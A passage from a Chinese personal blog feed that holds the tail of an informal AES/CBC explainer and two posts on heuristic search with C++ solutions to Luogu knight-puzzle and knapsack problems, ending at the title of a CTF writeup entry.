0x10</td><td>0x59</td><td>0x27</td><td>0x80</td><td>0xec</td><td>0x5f</td></tr><tr><td>D</td><td>0x60</td><td>0x51</td><td>0x7f</td><td>0xa9</td><td>0x19</td><td>0xb5</td><td>0x4a</td><td>0x0d</td><td>0x2d</td><td>0xe5</td><td>0x7a</td><td>0x9f</td><td>0x93</td><td>0xc9</td><td>0x9c</td><td>0xef</td></tr><tr><td>E</td><td>0xa0</td><td>0xe0</td><td>0x3b</td><td>0x4d</td><td>0xae</td><td>0x2a</td><td>0xf5</td><td>0xb0</td><td>0xc8</td><td>0xeb</td><td>0xbb</td><td>0x3c</td><td>0x83</td><td>0x53</td><td>0x99</td><td>0x61</td></tr><tr><td>F</td><td>0x17</td><td>0x2b</td><td>0x04</td><td>0x7e</td><td>0xba</td><td>0x77</td><td>0xd6</td><td>0x26</td><td>0xe1</td><td>0x69</td><td>0x14</td><td>0x63</td><td>0x55</td><td>0x21</td><td>0x0c</td><td>0x7d</td></tr></tbody></table><p>比如在第一个表中可以看到0行0列是0x63，与之对应的，在第二张表的第6行第三列就是0x00，也就是0x63在第一个表中的位置。因为AES是对称加密，所以每一步操作都需要可逆。</p><h2 id="行位移"><a href="#行位移" class="headerlink" title="行位移"></a>行位移</h2><p>这里要说一下，AES分组是16个字节一组，在加密的过程中16字节会形成4x4的矩阵，字节按照以下顺序排列</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/3.png" alt="3"></p><p>行移位是一个简单的左循环移位操作。第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示：</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/4.png" alt="4"></p><p>逆变换当然也很简单，就不细讲了。</p><h2 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h2><p>这个涉及到的知识比较多，我有点难以接受，mark一下，以后再补</p><p>就是说把它当成一个矩阵然后和另一个矩阵做乘法运算得到新的矩阵，至于逆过程就是对逆矩阵做乘法。然后这里面的加法就是异或，乘法会变成取模乘法。(应该是这样的)</p><h2 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h2><p>这个很简单，就是扩展密钥，密钥输入了16字节，每组四个字节就是四组，第一组和第四组异或得到第五组，第二组和第五组异或得到第六组，第三组和第六组异或得到第七组，以此类推。因为要加密10次，所以扩展出四十组密钥。</p><p>然后就是很简单的了，列混淆得到的矩阵再和密钥异或一下即可。每次都和不一样的密钥做异或，一共十次，这就是AES。</p><h1 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h1><p>分组加密有一个缺点，分组之间独立，一样的数据不管在第几组都是一样的加密，如果我已只很多密文明文对，那么加密的信息很可能会被暴力破解出来，CBC就是用来对抗这个缺点的。CBC不通的就是，会有一个初始向量与第一组的数据进行异或，然后第二组的会和第一组异或加密前的数据异或再进行加密，以此类推，这样的话，分组之间将不再独立，改动前面的一个字节很可能导致整个密文发生巨大变化。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>启发式搜索算法进阶</title>
      <link href="/2021/12/16/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6/"/>
      <url>/2021/12/16/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<p>继续来学启发式搜索</p><span id="more"></span><p>多的其实没啥好讲了的，因为概念问题在前一篇博文已经讲的很清楚了。主要就是训练寻找估值函数，多点题目练习能应对不通场景下的启发式搜索。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>洛谷上的<a href="https://www.luogu.com.cn/problem/P2324">p2324骑士精神</a></p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://cdn.luogu.com.cn/upload/pic/1389.png" alt="1"></p><p>主要就是说有个空格，然后所有马都走日，没有马脚，只能跳到空格里面去，然后问你是否能在15步以内达到。如果可以则输出最短步数，否则输出-1，因为空格只有一个我们不考虑跳马，考虑跳空格。</p><p>递归最大深度15层能确定了，但是任意一个状态可以延伸出最少2中最多八种情况。15作为指数时间上还是遭不住，考虑启发式搜索。那么估值函数需要怎么写呢？</p><h3 id="估值函数"><a href="#估值函数" class="headerlink" title="估值函数"></a>估值函数</h3><p>这里再补充点估值函数的知识。</p><p><em>f</em>(<em>n</em>)=<em>g</em>(<em>n</em>)+<em>h</em>(<em>n</em>)</p><p>估值函数一般表达式如上，g(n)为当前状态，h(n)为未来最优状态产生的花费，或者是其它。估值函数为两者和，由于当前状态我们很容易获取，所以算出未来最优状态即可等于获得了估值函数。可能前面讲的有点小问题，但是还是不妨碍的，因为我们平时写也基本是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">f</span>(n)+value&gt;ans)&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(n+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以问题不大。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>在本题中，我们的估值函数应该是算能到达目的状态的最小步数。那么这个怎么去考虑呢，其实可以拿当前状态与目标状态相比较，如果有两个点不符合目标状态，那么它们最优能达成目标状态一定是1，这里的最优指的是所有的这个情况下能达成目的状态的最小值。因为如果两个不符合的点不形成“日”字的关系，那么它们可能就不止需要1步了，但是估值并不是真的去计算真正的实际情况，估值函数需要尽可能的方便计算，这点很重要。</p><p>那么如果我们有三个点不一样那情况如何呢？那考虑最好的情况那还得是2步解决。所以我们很容易可以发现，假如当前状态与目标状态有n个点不一样，那么它最少需要n-1步来完成。</p><p>所以我们很容易可以写出估值函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        tot+=!!(qipan[i/<span class="number">5</span>][i%<span class="number">5</span>]^goal[i/<span class="number">5</span>][i%<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当估值函数返回-1的时候说明当前已经符合目标状态了，那么这个将作为搜索终止条件，并更新最优解。</p><p>剩下的就是终归中距的dfs了。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> goal[<span class="number">5</span>][<span class="number">5</span>]=&#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> qipan[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">-2</span>,<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>&#125;,dy[]=&#123;<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        tot+=!!(qipan[i/<span class="number">5</span>][i%<span class="number">5</span>]^goal[i/<span class="number">5</span>][i%<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> step)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;1&quot;);</span></span><br><span class="line">    <span class="keyword">if</span>(step&gt;<span class="number">15</span>)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">f</span>())&#123;</span><br><span class="line">        ans=<span class="built_in">min</span>(ans,step);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> new_x=x+dx[i],new_y=y+dy[i];</span><br><span class="line">        <span class="keyword">if</span>(new_x&lt;<span class="number">0</span>||new_x&gt;=<span class="number">5</span>||new_y&lt;<span class="number">0</span>||new_y&gt;=<span class="number">5</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">swap</span>(qipan[new_y][new_x],qipan[y][x]);</span><br><span class="line">        <span class="keyword">if</span>(step+<span class="built_in">f</span>()&lt;=<span class="built_in">min</span>(ans,<span class="number">15</span>))&#123;</span><br><span class="line">            <span class="built_in">search</span>(new_x,new_y,step+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(qipan[new_y][new_x],qipan[y][x]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">int</span> start_x,start_y;</span><br><span class="line">    ans=<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(s[j])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    ;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    qipan[i][j]=s[j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                    qipan[i][j]=<span class="number">2</span>;</span><br><span class="line">                    start_x=j;</span><br><span class="line">                    start_y=i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    ;</span><br><span class="line">                    <span class="built_in">perror</span>(<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">search</span>(start_x,start_y,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0x7fffffff</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好像不开氧气优化会被卡掉，我只能%氧气优化了，因为我实在不知道咋优化了。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> search </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>启发式搜索算法</title>
      <link href="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/"/>
      <url>/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>来快乐学算法了。</p><span id="more"></span><h2 id="启发式搜索"><a href="#启发式搜索" class="headerlink" title="启发式搜索"></a>启发式搜索</h2><p>启发式搜索（英文：heuristic search）是一种改进的搜索算法。它在普通搜索算法的基础上引入了启发式函数，该函数的作用是基于已有的信息对搜索的每一个分支选择都做估价，进而选择分支。简单来说，启发式搜索就是对取和不取都做分析，从中选取更优解或删去无效解。</p><p>在此之前，本蒟蒻一直就只会dfs和bfs，今天来学学新的搜索算法。经过多重资料的 查阅也是大概得知启发式搜索的大概思路，每次搜索会对之后可能的最优状态估值，如果估出来的值不如当前某些状态，那么我就直接舍弃这个状态。就比如经典01背包问题，我对每一个物品的抉择都有选或者不选两种选择，我发现我不选这个物品，选其它物品所产生的最优解不如我当前选这个解的状态好，那么我直接考虑选择这个而不去搜索不选择这个物品的状态。</p><h3 id="估值函数"><a href="#估值函数" class="headerlink" title="估值函数"></a>估值函数</h3><p>这里需要解释一下我如何判断当前状态是否优于之后的最优状态，那么这里需要这么一个估值函数，估值函数不是真的对那个情况做具体分析，那样的话跟暴力没区别了。我这样考虑，如果剩下所有物品全能放进去都不如我一个放进去价值大，那么我肯定得放这个物品(前提是放得进去，放不进去就别讨论了)。那么这个剩下的所有物品的价值就是我这一个启发式搜索方案的估值函数。</p><p>假如有n样物品，那么在搜索第x样物品的估值函数就是</p><p>$f(x)=\sum _{i=x} ^{n} a[i]$</p><p>我在判断一下这个要不要放的时候我只需要看看我历史最优值是否小于当前最优值+估值函数值就可以了，如果成立那就说明这个可能可以不放，否则这个必须要放，因为如果不放的话，它剩下就算全放都没有我历史搜索出来的最优值大，那么我就没必要搜索不放的情况了。当然这是其中一种启发式搜索的办法。还有其它的方式，我们下面讲。</p><h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><p>来自洛谷<a href="https://www.luogu.com.cn/problem/P1048">P1048 NOIP2005 普及组 采药</a></p><p>那么我按照我之前的启发式搜索方式得到了下面的算法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10001</span></span><br><span class="line"><span class="keyword">int</span> v[maxn],c[maxn];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=v[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> contain,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value&gt;ans)ans=value;</span><br><span class="line">    <span class="keyword">if</span>(now&gt;n)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(contain&gt;=c[now])</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain-c[now],value+v[now]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">f</span>(now)+value&gt;ans)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;c[i],&amp;v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">search</span>(<span class="number">1</span>,m,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以算出正确结果，但是有些点会T</p><p><img src="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/1.png" alt="1"></p><p>事实上我这样的启发式搜索方法还是有点暴力，因为后面的物品可能完全一个都放不进去，但是价值很大，这样的数据启发式搜索就会退化成朴素算法。</p><p>那么我如果换一种，我不管什么就一个个放进去看看能有多少最大的价值，为了保证能朴素地算出最大值我们可以先对物品的单位价值排序然后一个个放，而且我们需要假设物品可以分割。那不然的话等于是在后面的物品做一次动态规划，复杂度还是比较高的。所以我们可以得出估值函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(res&gt;c[i])&#123;</span><br><span class="line">            ans+=v[i];</span><br><span class="line">            res-=c[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ans+d[i]*res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后写出以下的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10001</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> c,v;</span><br><span class="line">    <span class="keyword">double</span> d;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(res&gt;a[i].c)&#123;</span><br><span class="line">            ans+=a[i].v;</span><br><span class="line">            res-=a[i].c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ans+(<span class="keyword">int</span>)(a[i].d*res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> contain,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value&gt;ans)ans=value;</span><br><span class="line">    <span class="keyword">if</span>(now&gt;n)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(contain&gt;=a[now].c)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain-a[now].c,value+a[now].v);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">f</span>(now,contain)+value&gt;ans)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> item &amp;a, <span class="keyword">const</span> item &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a.d &gt; b.d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int cmp(item a,item b)&#123;</span></span><br><span class="line"><span class="comment">    if(a.d&lt;b.d)return 0;</span></span><br><span class="line"><span class="comment">    return 1;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a[i].c,&amp;a[i].v);</span><br><span class="line">        a[i].d=(<span class="keyword">double</span>)a[i].v/a[i].c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    <span class="built_in">search</span>(<span class="number">1</span>,m,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功AC。</p><p><img src="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2.png" alt="2"></p><p>由此可见，只要我们选的估值函数够好，那么搜索它就不会那么暴力了，这大概也是启发式搜索算法的精髓，只要估值函数选的好，复杂度能直接从指数级降到(其实我也不知道是多少hhh)，但是个人觉得，只要估值函数写出来了，都是没问题的，因为代码量本身就很少，只是在做决策之前估计以下这一步到底值不值得就好了，然后就是递归大法好，可以看到我的search函数本身就这几句。</p><p>那么在这样的搜索里面启发式算法的估值函数很容易求，但是如果是迷宫类的问题，启发式算法还真的就难说了，等明天去看看迷宫类的启发式搜索吧。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> search </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF2019 polyre writeup writeup</title>
      <link href="/2021/12/15/%5BRoarCTF2019%5Dpolyre%20writeup/"/>
